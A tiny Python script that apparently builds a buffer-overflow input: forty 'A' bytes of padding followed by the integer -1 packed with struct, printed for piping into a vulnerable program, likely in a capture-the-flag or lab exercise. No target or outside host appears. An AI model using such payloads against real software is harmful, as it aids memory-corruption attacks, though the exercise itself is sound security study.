import struct


bfr = str.encode('A')*40


payload = struct.pack('i', -1)

print(payload)
print(struct.pack('s', bfr)*40 + payload)
